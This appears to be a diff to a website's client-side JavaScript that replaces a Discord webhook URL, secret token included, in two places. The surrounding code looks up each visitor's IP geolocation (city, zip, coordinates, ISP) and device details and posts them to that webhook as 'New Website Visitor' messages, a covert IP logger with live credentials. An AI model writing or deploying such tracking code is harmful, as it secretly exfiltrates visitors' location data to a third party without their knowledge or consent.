@@ -27,7 +27,7 @@
           // Fetch detailed IP info from ip-api.com
           fetchWithRetry(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,asname,mobile,proxy,hosting,query`)
             .then(ipData => {
-              const webhookUrl = 'https://discord.com/api/webhooks/1368256023323873361/gaOniOEwf1VxcMFjqZi4umFRLRApTjyd7phFHoCxnIHlDuCRGSwxzVw83zurUHEA6Tyc';
+              const webhookUrl = 'https://discord.com/api/webhooks/1368256025790119956/WzRvzO04z80UdSZWXIUG29PWwEiKJtJXbFvWt8Zp4bfib4riDf3Ftud0UyhK1QSpmuBW';
               // Get device info from user agent
               const userAgent = navigator.userAgent;
               let deviceInfo = 'Unknown';
@@ -121,7 +121,7 @@
         })
         .catch(() => {
           // Ultimate fallback: send basic embed if IP fetch fails
-          const webhookUrl = 'https://discord.com/api/webhooks/1368256023323873361/gaOniOEwf1VxcMFjqZi4umFRLRApTjyd7phFHoCxnIHlDuCRGSwxzVw83zurUHEA6Tyc';
+          const webhookUrl = 'https://discord.com/api/webhooks/1368256025790119956/WzRvzO04z80UdSZWXIUG29PWwEiKJtJXbFvWt8Zp4bfib4riDf3Ftud0UyhK1QSpmuBW';
           const embed = {
             embeds: [{
               title: 'New Website Visitor (Error)',
